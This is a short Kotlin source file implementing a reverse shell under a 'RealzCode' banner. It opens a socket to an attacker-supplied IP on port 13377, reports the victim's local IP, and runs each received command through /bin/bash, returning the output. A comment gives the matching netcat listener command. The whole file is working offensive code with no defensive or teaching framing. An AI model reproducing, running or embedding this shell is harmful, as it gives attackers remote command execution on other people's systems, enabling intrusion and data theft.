import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.PrintWriter
import java.net.Socket

fun main(args: Array<String>) {
    val we = """
        _____            _      _____          _      
       |  __ \          | |    / ____|        | |     
       | |__) |___  __ _| |___| |     ___   __| | ___ 
       |  _  // _ \/ _` | |_  / |    / _ \ / _` |/ _ \
       | | \ \  __/ (_| | |/ /| |___| (_) | (_| |  __/
       |_|  \_\___|\__,_|_/___|\_____\___/ \__,_|\___|
    """.trimIndent()

    val po = 13377 // nc -l -p 13377

    if (args.size < 1) {
        println("Please provide the IP address as a command-line argument.")
        return
    }

    val ip = args[0]

    val clientIp = java.net.InetAddress.getLocalHost().hostAddress
    val fullWe = "$we\nClient IP: $clientIp\n"

    val socket = Socket(ip, po)
    val writer = PrintWriter(socket.getOutputStream(), true)
    val reader = BufferedReader(InputStreamReader(socket.getInputStream()))

    println("$ip:$po")
    writer.println(fullWe)

    val cmd = CharArray(po)

    while (true) {
        writer.print("$ ")
        writer.flush()

        val bytesRead = reader.read(cmd)
        if (bytesRead <= 0) {
            break
        }

        val command = String(cmd, 0, bytesRead).trim()

        if (command == "exit") {
            break
        }

        val process = Runtime.getRuntime().exec(arrayOf("/bin/bash", "-c", command))
        val output = process.inputStream.bufferedReader().readText()
        writer.print(output)
        writer.flush()
    }

    socket.close()
}
